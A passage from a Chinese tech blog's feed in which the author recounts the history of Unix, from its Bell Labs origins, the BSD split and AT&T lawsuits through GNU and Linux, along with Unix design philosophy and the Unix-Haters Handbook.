<p>自从Linux出现以后，一个新的黑客领袖出现了，Linus Torvalds的中庸态度网聚了世界上顶尖的黑客，其绕过了GPL和反GPL的派系之争，他使用GNU的工具从而以GPL的“传染性”保护了Linux，但他同时也不承认RMS的理论思想体系，他即开源，又支持商业化。虽然，他没有带给黑客们什么重要的思想体系或统一的价值观，但他整合了全世界黑客的阵营，让所有的黑客的行为都围绕着Linux这一事物进行。他以“用自由软件是因为它运行得更好”轻而易举地盖过了“用自由软件是因为所有软件都该是自由的”。</p>
<p>1998年初，这种新思潮促使网景公司（Netscape Communications）公布了其Mozilla浏览器的源码。媒体对此事件的关注促成了Linux在华尔街的上市，推动了1999－2001年间科技股的繁荣。事实证明，此事无论对黑客文化的历史还是对Unix的历史都是一个转折点。</p>
<h3>Unix的历史教训</h3>
<p>下面的文字出自《<em>The Art of Unix Programming</em>》（Unix编程艺术）。令今天我们所有人所反思。</p>
<p>在Unix历史中，最大的规律就是： （看看《<a rel="bookmark" href="https://coolshell.cn/articles/1360.html" target="_blank">谁写了Linux</a>》你就会知道这一规律）</p>
<p><strong>距开源越近就越繁荣。任何将Unix</strong><strong>专有化的企图，只能陷入停滞和衰败。</strong></p>
<p>回顾过去，我们早该认识到这一点。1984年至今，我们浪费了十年时间才学到这个教训。如果我们日后不思悔改，可能还得大吃苦头。</p>
<p>虽然我们在软件设计这个重要但狭窄的领域比其他人聪明，但这不能使我们摆脱对技术与经济相互作用影响的茫然，而这些就发生在我们的眼皮底下。即使Unix社区中最具洞察力、最具远见卓识的思想家，他们的眼光终究有限。对今后的教训就是：<strong>过度依赖任何一种技术或者商业模式都是错误的</strong>——相反，保持软件及其设计传统的的灵活性才是长存之道。</p>
<p>另一个教训是：<strong>别和低价而灵活的方案较劲</strong>。或者，换句话说，低档的硬件只要数量足够，就能爬上性能曲线而最终获胜。经济学家Clayton Christensen称之为“破坏性技术”，他在《创新者窘境》（The Innovator’s Dilemma）[Christensen]一书中以磁盘驱动器、蒸汽挖土机和摩托车为例阐明了这种现象的发生。当小型机取代大型机、工作站和服务器取代小型机以及日用Intel机器又取代工作站和服务器时，我们也看到了这种现象。开源运动获得成功正是由于软件的大众化。Unix要繁荣，就必须继续采用吸纳低价而灵活的方案的诀窍，而不是去反对它们。</p>
<p>最后，旧学派的Unix社区因采用了传统的公司组织、财务和市场等命令机制而最终未能实现“职业化”。只有痴迷的“黑客”和具有创造力的怪人结成的反叛联盟才能把我们从愚蠢中拯救出来——他们接着教导我们，真正的专业和奉献精神，正是我们在屈服于世俗观念的“合理商业做法”之前的所作所为。</p>
<h3>Unix族谱</h3>
<p>Unix的故事仍旧延续着……，许多网站也为这段历史留下记录。一个详细记录Unix历史的网站（http://www.levenez.com/unix/），这个网站忠实记载着1969～2005 年Unix发展的大事，而且还有 PDF 档案可供下载，上面有一个庞大的UNIX家族版本树，让人叹为观止。网站的首页陈列每个时期Unix的历史，也代表着无数工程师的心血与努力。</p>
<p>下面是一个简单的Unix的族谱：</p>
<pre>     |--AT&amp;T (1969)-----\
     |                  |
     |              V6 (1976)
     |                  |
     |              V7 (1979)
     |                  |
     |   Novell owns AT&amp;T's Unix (by 1994)
     |     _____________|____________________
     |     |       |      |        |         |
     |    AIX    IRIX    SCO   HP-UX   Solaris 2.X
     |   (IBM)   (SGI)          (HP)     (Sun)
     |
     |
     |--Berkley (1977)-----\
     |                     |
     |                  1BSD (1977)
UNIX-|                     |
     |                4.4BSD (1993)
     |                     |
     |                   Net/2
     |                     |
     |               4.4BSD-Lite (by 1995)
     |     ________________|____________________________________
     |     |       |          |         |          |            |
     |   SunOS   Ultrix   NetBSD    OSF/1   NeXTSTEP   Mac OS X
     |   (Sun)   (DEC)   (Various)  (DEC)    (NeXT)    (Apple)
     |                   (FreeBSD)
     |
     |
     |--Hybrids----\
                   |
                Linux (Various)
                   |
                   |____________________________________________
                   |    |      |          |              |      |
                   | RedHat  Debian  Mandrake   Slackware    S.u.S.E.
                   |                          (Walnut Creek)
                   |
                   |_____________________________________________
                       |        |           |          |        |
                    MkLinux  LinuxPPC  TurboLinux  OpenLinux  CorelLinux
                    (Apple)                        (Caldera)   (Corel)</pre>
<p>点些查看《<a rel="bookmark" href="https://coolshell.cn/articles/85.html" target="_blank">Linux 分发包族谱</a>》</p>
<h3>Unix的特点</h3>
<p>现在的文献中提到Unix基本上是说，由Ken Thompson和Dennis Ritchie共同开发的。而通过历史我们也能发现，Unix的主要是由Ken Thompson写下的。但在学术界，Dennis Ritchie的名字往往被排在了Ken Thompson前面的。这就是因为，Dennis Ritchie不但发明了C语言，而且当时他设计Unix操作系统的设计思想，影响了整个世界，直到今天。</p>
<p>当时，他们开发UNIX，没有正式立项，是Ken Thompson和Dennis Ritchie等少数几个人偷偷干的，如果一切都要从头从新设计，那几乎是不可能的。所以，Unix吸取与借鉴了Multics的经验，如内核，进程，层次式目录，面向流的I/O，把设备当作文件，……等等。但是Unix在继承中又有创新，比如Unix采用一种无格式的文件结构，文件由字节串加\0组成。这带来两大好处：一是在说明文件时不必加进许多无关的“填充物”，二是任何程序的输出可直接用作其他任何程序的输入，不必经过转换。后面这一点叫做“管道”(piping)，这就是Unix首创的。此外，像把设备当作文件，从而简化了设备管理这一操作系统设计中的难题，虽然不是UNIX的发明，但是实现上它采用了一些新方法，比Multics更高明一些。</p>
<p>下面是Unix的特点：（30多年过去了，这些东西早已变成经典）</p>
<ul>
<li>
<strong>Everything (including hardware) is a file<br>
</strong>所有的事物（甚至硬件本身）都是一个的文件。</li>
<li>
<strong>Configuration data stored in text<br>
</strong>以文本形式储存配置数据。</li>
<li>
<strong>Small, single-purpose program<br>
</strong>程序尽量朝向小而单一的目标设计</li>
<li>
<strong>Avoid captive user interfaces<br>
</strong>尽量避免令人困惑的用户接口</li>
<li>
<strong>Ability to chain program together to perform complex tasks<br>
</strong>将几个程序连结起来，处理大而复杂的工作。</li>
</ul>
<h3>Unix的影响和哲学</h3>
<p>Unix是第三次工业革命中计算机软件领域最具代表性的产物。在这近40年中，由Unix造成的影响是最有深远意义的。就我看来，Unix为软件领域带来了至少以下有积极的东西，由这些东西所引发的直接或间接的事物更是举不胜数。</p>
<ol>
<li>软件开发的若干哲学和思想。</li>
<li>全民参与推动软件，代码共享的模式。</li>
<li>开启了黑客文化和开源项目。</li>
<li>免费和商业的完美结合的Linux。</li>
<li> C语言，而后发展的C++，Java等等类C的语言和脚本。（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1984.html" target="_blank">C语言的演变史</a>》）</li>
<li> TCP/IP，其的Socket编程已成为今天通用的网络编程主流。（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1532.html" target="_blank">到处都是Unix的胎记</a>》）</li>
</ol>
<p>不能不说，AT&amp;T虽然发展了Unix，但今天Unix的混乱的局面也和AT&amp;T 有着直接原因。但反过来说，如果没有AT&amp;T的反面教材，今天的GNU/Linux很有可能也不会出现。AT&amp;T究竟是限制了Unix的发展，还是以反面示例促进了Unix社区，已不好评说。今天，软件是商业化好还是开源好的争论还在继续，纵观这几十年来Unix的历史，Linux的划时代地出现。相信你会得出自己的结论。不管怎么样，Unix的经历对计算机领域贡献的不单单是技术，他给我们提供了丰富而生动的教材。特别是Unix引发的哲学，让今天的我们依然受益不浅。</p>
<p>说到Unix为我们所带来的软件开发的哲学，我必需要说一说。Unix遵循的原则是KISS（Keep it simple, stupid）。在<a href="https://en.wikipedia.org/wiki/Unix_philosophy">http://en.wikipedia.org/wiki/Unix_philosophy</a> 上有很多的基本上大同小异的Unix哲学，都是很经典的。</p>
<p>Doug McIlroy 是认为UNIX的哲学是这样的：三条哲学，简明扼要，就是这三条哲学贯穿着整个Unix世界。尤其是第一条“do one thing and do it well”真是相当精彩！</p>
<ul>
<li><strong>Write programs that do one thing and do it well.</strong></li>
<li><strong>Write programs to work together.</strong></li>
<li><strong>Write programs to handle text streams, because that is a universal interface.</strong></li>
</ul>
<p>只要是Unix的程序员，他们会比别的程序员在任何时候都会不停地强调着这三条哲学。</p>
<p>而《<em>The Art of Unix Programming</em>》总结了下面这些哲学，都是至理名言啊。</p>
<ul>
<li>Rule of Modularity: Write simple parts connected by clean interfaces.</li>
<li>Rule of Clarity: Clarity is better than cleverness.</li>
<li>Rule of Composition: Design programs to be connected to other programs.</li>
<li>Rule of Separation: Separate policy from mechanism; separate interfaces from engines.</li>
<li>Rule of Simplicity: Design for simplicity; add complexity only where you must.</li>
<li>Rule of Parsimony: Write a big program only when it is clear by demonstration that nothing else will do.</li>
<li>Rule of Transparency: Design for visibility to make inspection and debugging easier.</li>
<li>Rule of Robustness: Robustness is the child of transparency and simplicity.</li>
<li>Rule of Representation: Fold knowledge into data so program logic can be stupid and robust.</li>
<li>Rule of Least Surprise: In interface design, always do the least surprising thing.</li>
<li>Rule of Silence: When a program has nothing surprising to say, it should say nothing.</li>
<li>Rule of Repair: When you must fail, fail noisily and as soon as possible.</li>
<li>Rule of Economy: Programmer time is expensive; conserve it in preference to machine time.</li>
<li>Rule of Generation: Avoid hand-hacking; write programs to write programs when you can.</li>
<li>Rule of Optimization: Prototype before polishing. Get it working before you optimize it.</li>
<li>Rule of Diversity: Distrust all claims for “one true way”.</li>
<li>Rule of Extensibility: Design for the future, because it will be here sooner than you think.</li>
</ul>
<p>X Windows 的设计者 Mike Gancarz 给出了下面九条哲学思想</p>
<ol>
<li><em>Small is beautiful.</em></li>
<li><em>Make each program do one thing well.</em></li>
<li><em>Build a prototype as soon as possible.</em></li>
<li><em>Choose portability over efficiency.</em></li>
<li><em>Store data in flat text files.</em></li>
<li><em>Use software leverage to your advantage.</em></li>
<li><em>Use shell scripts to increase leverage and portability.</em></li>
<li><em>Avoid captive user interfaces.</em></li>
<li><em>Make every program a filter.</em></li>
</ol>
<p>在今天，这种思想依然被传承着，在影响着世界上各个角落的每一个程序员。</p>
<h3>Unix痛恨者手册</h3>
<p>这里还需要值得一提的是一本叫《The Unix-Haters Handbook》，中文译做《Unix痛恨者手册》。可以在这里下载：<a href="http://research.microsoft.com/~daniel/uhh-download.html">http://research.microsoft.com/~daniel/uhh-download.html</a>。其中以调侃的语气声讨了Unix的种种不是。虽然这是十年前的一本书了，但还是值得一读。这本书指出了许多Unix的设计错误，指出了种种看起来很合理的设计走向了荒谬，还这样调侃了C语言——“如果说C语言给足了让你上吊的绳子，那么，C++在给了你足够的绳子把你的邻居全部捆起来之后，还给了你足够的绳子让你为一艘小帆船装上帆，最后你还有足够的绳子把自己吊死在帆船的桅杆上”。呵呵，相当的尖酸刻薄吧。里面有一句对操作系统的评价是这样的：“The fundamental difference between Unix and the Macintosh operating system is that <strong>Unix was designed to please programmers</strong>, whereas the Mac was designed to please users. (Windows, on the other hand, was designed to please accountants.”（Windows设计给会计人员？！连计算机用户都不是了，呵呵）</p>
<p>不过，我可以感觉得到这本书的作者在书中对Unix的感情是比较复杂的，爱恨交加，在书的最后有这样一句话“would anyone have spent this much time and effort writing about how much they hated Unix if they didn’t secretly love it? I’ll leave that to the readers to judge, but in the end, it really doesn’t matter: If this book doesn’t kill Unix, nothing will”。是的，如果Unix能够存活这么长的时间，那么，不会有什么东西可以把他消灭了。</p>
<p>从《Unix痛恨者手册》这本书，再加上Unix的历史，我们可以感到Unix的经历的风风雨雨，在Unix上面出现有种种教训，近40年的历程，Unix历经磨难，几近夭折，一路走来的确很不容易，让人由衷感叹。今天的Unix，今天的软件工业和以前相比已是不可同日而语。很大程度上，这些都要归功于这个充满苍桑的Unix。</p>
<h3>后记</h3>
<p>在中国我们开始学习计算机的时候，我们被Microsoft所创造的文化所笼罩里。就在Unix出现革命性的转变，在Unix影响计算机世界文化的那几年里，科班出生专业开发人员学习的是MS-DOS和微软的文化，我们犹如一个井底之蛙一样，对外面的翻天覆地的变化无动于衷。微软创造的文化在我们这里尤其地根深蒂固，我们几乎忘记了另外一边的Unix（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1032.html" target="_blank">Unix 40年：Unix年鉴</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1023.html">Unix 40年：昨天，今天和明天</a>》）。</p>
<p>在那充满激情的Unix的岁月里，大伙为了科研目的或个人兴趣在Unix上进行各种开发，并且不计较金钱利益，将这些源码公开，互相共享。在那里，开发和自由成为主题，正因为如此，当今的世界才如此丰富多采。在40年Unix文化和技术积淀的里面，蕴涵着比较纯正的计算机文化和思想。</p>
<p>纵观整个Unix的历史过程中，许许多多的程序员、工程师前辈们在Unix中所摸爬滚打，他们的辛勤地、他们呕心沥血地跟随Unix，努力建立一个繁荣的计算机世界的文明。Unix不是一个简简单单的操作系统。有人说，Unix是程序员设计给程序员的，一点没错。Unix的近40年历史造就了它的博大精深，它给程序员们带来的绝不仅仅只是技术上的知识。它的失误，它的无奈，它的精神，它的荣耀，它从技术和思想上都启迪着我们。对于程序员来说，学习Unix就等同于向前辈程序学习。无论你是什么样的程序员，你都应该了解Unix，这是开发人员的根，前面的开发者造就了它，而它又在引领后面的开发人员，它是前辈程序员们交给我们的一份礼物，一个接力棒，它是开发人员赖以生存的土壤，是上一辈程序员留给我们这一代程序员开启未来的钥匙。Unix就像一个程序员教父一样，理当受到我们的尊敬和崇拜。</p>
<h3>参考资料</h3>
<ul>
<li>Peter H. Salus 的《<em>A Quarter Century of UNIX</em>》，这被认为是UNIX的标准历史。</li>
<li>Eric S. Raymond 的《<em>The Art of Unix Programming</em>》</li>
<li>
<a href="https://www.wikipedia.org/">http://www.wikipedia.org/</a> 维基百科</li>
<li>
<a href="http://www.computerhope.com/history/">http://www.computerhope.com/history/</a> Computer History</li>
<li>
<a href="http://www.lotsir.com/Blog/article.asp?id=494">http://www.lotsir.com/Blog/article.asp?id=494</a> Lotsir’s Blog — 《<em>Unix&amp;Linux</em><em>历史重温</em>》</li>
<li>
<a href="http://www.aka.org.cn/Docs/hacker-history.html">http://www.aka.org.cn/Docs/hacker-history.html</a> 《<em>黑客文化简史</em>》</li>
<li>
<a href="https://www.simson.net/ref/ugh.pdf">http://www.simson.net/ref/ugh.pdf</a> 《<em>The UNIX-HATERS Handbook</em>》</li>
<li>
<a href="http://free-electrons.com/doc/free_software/img0.html">http://free-electrons.com/doc/free_software/img0.html</a> 《<em>GNU/Linux Free Software</em>》幻灯片</li>
<li>
<a href="http://cm.bell-labs.com/cm/cs/who/dmr/hist.html">http://cm.bell-labs.com/cm/cs/who/dmr/hist.html</a> <em>Dennis M. Ritchie </em>《<em>The Evolution of the Unix Time-sharing System</em>》</li>
</ul>
<h2>(转载时请注明作者和出处。未经许可，请勿用于商业用途)</h2>
<p></p>
 ]]></content>
<pubDate>2010-04-09T08:44:57+08:00</pubDate>
<guid>https://coolshell.cn/articles/2324.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Unix传奇(上篇) ]]></title>
<link>https://coolshell.cn/articles/2322.html</link>
<content><![CDATA[ 
<p><span style="color: #808080;">【本文曾于2007年3月于</span><a href="http://blog.csdn.net/haoel" target="_blank"><span style="color: #0000ff;">我在CSDN上的BLOG</span></a><span style="color: #808080;">发布，现在我把其搬到酷壳来，一来是觉得这段历史相当传奇，值得大家再看看，二来也和我在酷壳上发布的一些文章相互链接。】</span></p>
<hr>
<p>了解过去，我们才能知其然，更知所以然。总结过去，我们才会知道我们明天该如何去规划，该如何去走。在时间的滚轮中，许许多的东西就像流星一样一闪而逝，而有些东西却能经受着时间的考验散发着经久的魅力，让人津津乐道，流传至今。要知道明天怎么去选择，怎么去做，不是盲目地跟从今天各种各样琳琅满目前沿技术，而应该是去 —— 认认真真地了解和回顾历史。 </p>
<p>Unix是目前还在存活的操作系统的元老了，走过了40年的历程（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1032.html" target="_blank">Unix 40年：Unix年鉴</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1023.html">Unix 40年：昨天，今天和明天</a>》）。在技术更新如此迅速的计算机世界的今天，Unix始终保持它那神圣的光环，它那曲折和令人叹息的历史，以及由它引发的思想变革，对当今计算机文化造成的深远影响，这40年所产生的人和事，让它成为了一个传奇，不能不让人为之惊叹。</p>
<p>这是一段所有从事计算机行业人员尤其是软件开发人员需要了解的历史。Unix的传奇历史是整个计算机世界文化最具代表性的，它对整个计算机世界文化的影响也是最巨大，最深远的。他给人带来的不单单的对过去的回味，更为我们带来了计算机世界的新思潮。</p>
<p>了解这段的历史的人，才能体会计算机世界变迁过程中的是是非非，才能了解计算机世界中的文化，从而才能参与到整个计算机革命的大潮中。希望这段历史，这篇文章能让你感受到计算机世界那强力的脉搏，从而让你踏上这条令人充满激情的道路。</p>
<p><strong><a href="https://coolshell.cn/articles/2322.html" target="_blank">上篇</a></strong></p>
<ul>
<li>Unix起源</li>
<li>Unix分裂</li>
<li>Unix的法律纠纷</li>
<li>GNU开源组织</li>
<li>Linux横空出世</li>
<li>Linux今天的领袖</li>
</ul>
<p><span id="more-2322"></span></p>
<p><strong><a href="https://coolshell.cn/articles/2324.html" target="_blank">下篇</a></strong></p>
<ul>
<li>Unix与黑客文化</li>
<li>Unix的历史教训</li>
<li>Unix 家族谱</li>
<li>Unix的特点</li>
<li>Unix的影响和哲学</li>
<li>Unix痛恨者手册</li>
</ul>
<p> </p>
<h3>Unix 起源</h3>
<p> 回顾Unix历史，我们就要说一下一个叫MULTICS（Multiplexed Information and Computing Service）的项目。上世纪六十年代时，大部份计算机都是采用批处理（Batch Processing）的方式（也就是说，当作业积累一定数量的时候，计算机才会进行处理）。那时，我们熟知的美国电话及电报公司（American Telephone and Telegraph Inc.；AT&amp;T）、通用电器公司（General Electrics；G.E.）及麻省理工学院（Massachusetts Institute of Technology；MIT）计划合作开发一个多用途（General-Purpose）、分时（Time-Sharing）及多用户（Multi-User）的操作系统，也就是这个MULTICS，其被设计运行在GE-645大型主机上。不过，这个项目由于太过复杂，整个目标过于庞大，糅合了太多的特性，进展太慢，几年下来都没有任何成果，而且性能都很低。于是到了1969年2月，贝尔实验室（Bell Labs）决定退出这个项目。</p>
<p> 熟悉这段历史的人都知道，贝尔实验室中的有个叫Ken Thompson的人，他为MULTICS这个操作系统写游戏了个叫“Space Travel”的游戏，在MULTICS上经过实际运行后，他发现游戏速度很慢而且耗费昂贵 —— 每次运行会花费75美元。退出这个项目以后。他为了让这个游戏能玩，所以他找来Dennis Ritchie为这个游戏开发一个极其简单的操作系统。这就是后来的Unix。（值得一提的是，当时他们本想在DEC-10上写，后来没有申请到，只好在实验室的墙角边找了一台被人遗弃的Digital PDP-7的迷你计算机进行他们的计划，这台计算机上连个操作系统都没有，于是他们用汇编语言仅一个月的时间就开发了一个操作系统的原型）他们的同事Brian Kernighan非常不喜欢这个系统，嘲笑Ken Thompson说：“你写的系统好真差劲，干脆叫Unics算了。”Unics的名字就是相对于MULTICS的一种戏称，后业改成了Unix。于是，Unix就在这样被游戏和玩笑创造了，当时是1969年8月。也就是这一年，Linux之父Linus Torvalds在芬兰出生了。</p>
<p>1971年，Ken Thompson写了充分长篇的申请报告，申请到了一台PDP-11/24的机器。于是Unix第一版出来了。在一台PDP-11/24的机器上完成。这台电脑只有24KB的物理内存和500K磁盘空间。Unix占用了12KB的内存，剩下的一半内存可以支持两用户进行Space Travel的游戏。而著名的fork()系统调用也就是在这时出现的。</p>
<p>到了1973年的时候，Ken Thompson 与Dennis Ritchie感到用汇编语言做移植太过于头痛，他们想用高级语言来完成第三版，对于当时完全以汇编语言来开发程序的年代，他们的想法算是相当的疯狂。一开始他们想尝试用Fortran，可是失败了。后来他们用一个叫BCPL（Basic Combined Programming Language）的语言开发，他们整合了BCPL形成B语言，后来Dennis Ritchie觉得B语言还是不能满足要求，就是就改良了B语言，这就是今天的大名鼎鼎的C语言。于是，Ken Thompson 与Dennis Ritchie成功地用C语言重写了Unix的第三版内核。至此，Unix这个操作系统修改、移植相当便利，为Unix日后的普及打下了坚实的基础。而Unix和C完美地结合成为一个统一体，C与Unix很快成为世界的主导。</p>
<p>Unix的第一篇文章 “The UNIX Time Sharing System”由Ken Thompson和Dennis</p>
<p>Ritchie于1974年7月的 the Communications of the ACM发表。这是UNIX与外界的首次接触。结果引起了学术界的广泛兴趣并对其源码索取，所以，Unix第五版就以“仅用于教育目的”的协议，提供给各大学作为教学之用，成为当时操作系统课程中的范例教材。各大学公司开始通过Unix源码对Unix进行了各种各样的改进和扩展。于是，Unix开始广泛流行。</p>
<p style="text-align: center;"><img alt="image placeholder" ><br>
Ken Thompson &amp; Dennis Ritchie</p>
<p> </p>
<h3>Unix分裂</h3>
<p>1978年，对 Unix而言是革命性的一年；因为学术界的老大柏克利大学 （UC Berkeley），推出了一份以第六版为基础，加上一些改进和新功能而成的 Unix。这就是著名的“1 BSD（1st Berkeley Software Distribution）”，开创了Unix的另一个分支：BSD 系列。 同时期，AT&amp;T成立USG（Unix Support Group），将 Unix变成商业化的产品。从此，BSD的 Unix 便和AT&amp;T 的Unix 分庭抗礼，Unix就分为System IV和4.x BSD这两大主流，各自蓬勃发展。</p>
<p>1979年发布的Unix 第七版被称为是“最后一个真正的Unix”，这个版本的Unix内核只有40K bytes。后来这个版本被移植到VAX机上（我在大学时学习C语言时用过这个VAX机，我还记得那时上VAX机最大的爱好就是使用talk命令和别人聊天，呵呵）。20世纪80年代相继发布的8、9、10版本只授权给了少数大学。</p>
<p>1982年，AT&amp;T基于版本7开发了UNIX System Ⅲ的第一个版本，这是一个商业版本仅供出售。为了解决混乱的UNIX版本情况，AT&amp;T综合了其他大学和公司开发的各种UNIX，开发了UNIX System V Release 1。这个新的UNIX商业发布版本不再包含源代码，所以加州大学Berkeley分校继续开发BSD UNIX，作为UNIX System III和V的替代选择。BSD对UNIX最重要的贡献之一是TCP/IP。BSD 有8个主要的发行版中包含了TCP/IP：4.1c、4.2、4.3、4.3-Tahoe、4.3-Reno、Net2、4.4以及 4.4-lite。这些发布版中的TCP/IP代码几乎是现在所有系统中TCP/IP实现的前辈，包括AT&amp;T System V UNIX 和Microsoft Windows中的TCP/IP都参照了BSD的源码。</p>
<p>同时，其他一些公司也开始为其自己的小型机或工作站提供商业版本的UNIX系统，有些选择System V作为基础版本，有些则选择了BSD。BSD的一名主要开发者，Bill Joy，在BSD基础上开发了SunOS，并最终创办了Sun Microsystems。</p>
<p style="text-align: center;"> <img alt="image placeholder" ><br>
Bill Joy</p>
<p> 1991年，一群BSD开发者（Donn Seeley、Mike Karels、Bill Jolitz 和 Trent Hein）离开了加州大学，创办了Berkeley Software Design, Inc (BSDI)。BSDI是第一家在便宜常见的Intel平台上提供全功能商业BSD UNIX的厂商。后来Bill Jolitz 离开了BSDI，开始了386BSD的工作。386BSD被认为是FreeBSD、OpenBSD 和 NetBSD、DragonFlyBSD的先辈。</p>
<p>这是一个AT&amp;T妄图私有化的Unix的时代。为了私有化Unix，1986年IEEE指定了一个委员会制定了一个一个开放作业系统的标准,称为 POSIX (Portable Operating Systems Interface)。最后加上个X，不知道是为了好听，还是因为这本质上是UNIX的标准。当然，AT&amp;T的Unix取得了这个标准制订战争的胜利，还取得了Unix这个注册商标。此时BSD的拥护者自喻为冷酷无情的公司帝国的反抗军。就销售量来说，AT&amp;T UNIX始终赶不上BSD/Sun。到1990年，AT&amp;T与BSD版本已难明显区分，因为彼此都有采用对方的新发明。</p>
<p> 这段时期，从实验室出来的被全世界所分享的Unix，正处于被私有化的关键时期。（这里有一个笑话——《<a rel="bookmark" href="https://coolshell.cn/articles/1439.html" target="_blank">Alice梦游UNIX仙境</a>》）</p>
<h3>Unix的法律纠纷</h3>
<p> Berkeley Software Design, Inc（BSDI）很快就与AT&amp;T的UNIX Systems Laboratories（USL）附属公司产生了法律纠纷，USL是AT&amp;T注册的公司。AT&amp;T为了拥有System V版权，以及Unix商标，为了垄断Unix，1992年，USL正式对BSDI提起诉讼，说BSD剽窃他的源码。而最终了结了好评如潮的BSD系统。</p>
<p>由于最后判决悬而未决，这桩法律诉讼将BSD后裔的开发，特别是自由软件，延迟了两年，这导致没有法律问题的Linux内核获得了极大的支持。Linux跟386BSD的开发几乎同时起步，Linus说，当时如果有自由的基于386的Unix-like操作系统，他就可能不会创造Linux。尽管无法预料这给以后的软件业究竟造成了什么样的影响（如果没有这个法律纠纷，很有可能没有今天的革命性的Linux），但有一点可以肯定，Linux更加丰富了这块土壤。</p>
<p>这场官司一直打到 AT&amp;T将自己的Unix系统实验室卖掉，新接手的Novell公司采取了一种比较开明的做法，允许BSDI自由发布自己的BSD，但是前提是必须将来自于AT&amp;T的代码完全删除，于是诞生了4.4 BSD Lite版，由于这个版本不存在法律问题，4.4BSD Lite成为了现代BSD系统的基础版本。</p>
<p>这桩诉讼最终在1994年1月了结，更多地满足了BSDI的利益。伯克利套件的18,000个文件中，只有3个文件要求删除，另有70个文件要求修改，并显示USL的版权说明。这项调解另外要求，USL不得对4.4BSD提起诉讼，不管是用户还是BSDI代码的分发者。于是，BSD Unix走上了复兴的道路。BSD的开发也走向了几个不同的方向，并最终导致了FreeBSD、OpenBSD和NetBSD的出现。</p>
<p>从AT&amp;T意识到了Unix的商业价值，不再将Unix源码授权给学术机构以来，到以后的几十年，Unix仍在不断变化，其版权所有者不断变更，授权者的数量也在增加。Unix的版权曾经为AT&amp;T所有，之后Novell拥有了Unix，再之后Novell又将版权出售给了SCO（这一事实双方尚存在争议）。有很多大公司在取得了Unix的授权之后，开发了自己的Unix产品。（几年前，据传闻微软为了限制Linux，微软让SCO到法院告Linux剽窃其源码）</p>
<p>由于Unix是由C语言写的，所以修改和移植都很容易，因此，很多商业公司及学术机构均加入这个操作系统的研发，各个不同版本的Unix也开始蓬勃发展。这才产生了今天这么多的各式各样的Unix衍生产品。如AIX、Solaris、HP-UX、IRIX、OSF、Ultrix等等。（这些商业化的Unix基本上都是源于AT&amp;T授权的Unix System V）</p>
<h3>Unix开源组织</h3>
<p>AT&amp;T的这种商业态度，让当时许许多的Unix的爱好者和软件开发者们感到相当的痛心和忧虑，他们认为商业化的种种限制并不利于产生的发展，相反还能导制产品出现诸多的问题。随着商业化Unix的版本的种种限制和诸多问题，引起了大众的不满和反对。于是，大家开始有组织地结成“反叛联盟”以此对抗欺行罢市的AT&amp;T等商业化行为。</p>
<p>另一方面，关于“大教堂”（集权、封闭、受控、保密）和“集市”（分权、公开、精细的同僚复审）两种开发模式的对比成为了新思潮的中心思想。这个新思潮对IT业产生了非常深远影响。为整个计算机世界带来了革命性的价值观。</p>
<p><img alt="image placeholder" >此时，一个名叫Richard Stallman的领袖出现了，他认为Unix是一个相当好的操作系统，如果大家都能够将自己所学贡献出来，那么这个系统将会更加的优异！他倡导的Open Source的概念，就是针对Unix这一事实反对实验室里的产品商业化私有化。尽管Stallman既不是、也从来没有成为一个Unix程序员，但在后1980的大环境下，实现一个仿Unix操作系统成了他追求的明确战略目标。Richard Stallman早期的捐助者大都是新踏入Unix土地的老牌ARPANET黑客，他们对代码共享的使命感甚至比那些有更多Unix背景的人强烈。</p>
<p>为了这个理想，Richard Stallman于1984年创业了GNU，计划开发一套与Unix相互兼容的的软件。1985 年 Richard Stallman 又创立了自由软件基金会（Free Software Foundation）来为 GNU 计划提供技术、法律以及财政支持。尽管 GNU 计划大部分时候是由个人自愿无偿贡献，但 FSF 有时还是会聘请程序员帮助编写。当 GNU 计划开始逐渐获得成功时，一些商业公司开始介入开发和技术支持。当中最著名的就是之后被 Red Hat 兼并的 Cygnus Solutions。</p>
<p>GNU组织的建立，延续了当年Unix刚出现时的情形，并为这种情形建立了可靠的法律和财务保障。GNU 工程十几年以来, 已经成为一个对软件开发主要的影响力量， 创造了无数的重要的工具。例如：强健的编译器，有力的文本编辑器，甚至一个全功能的操作系统。从那时开始，许多程序员聚集起来开始开发一个自由的、高质量、易理解的软件，让这使得Unix社区生机勃勃，一派繁荣景象。</p>
<p> 自90年代发起这个计划以来，GNU 开始大量的产生或收集各种系统所必备的组件，像是——函数库（libraries）、编译器（compilers）、调式工具（debugs）、文本编辑器（text editors）、网站服务器（web server），以及一个Unix的使用者接口（Unix shell）等等，等等。但由于种种原因，GNU一直没有开发操作系统的kernel。正当Richard Stallman在为操作系统内核伤脑筋的时候，Linux出现了。</p>
<h3>Linux横空出世</h3>
<p><img alt="image placeholder" >1990年，Linus Torvalds还是芬兰赫尔辛基大学的一名学生，最初是用汇编语言写了一个在80386保护模式下处理多任务切换的程序，后来从Minix（Andy Tanenbaum教授所写的很小 的Unix操作系统,主要用于操作系统教学）得到灵感，进一步产生了自认为狂妄的想法——写一个比Minix更好的Minix，于是开始写了一些硬件的设备驱动程序，一个小的文件系统。这样0.0.1版本的Linux就出来了，但是它只具有操作系统内核的勉强的雏形，甚至不能运行，你必须在有Minix的机器上编译以后才能玩。这时候Linus已经完全着迷而不想停止，决定踢开Minix，于是在1991年10 月5号发布Linux 0.0.2版本,在这个版本中已经可以运行bash 和gcc。</p>
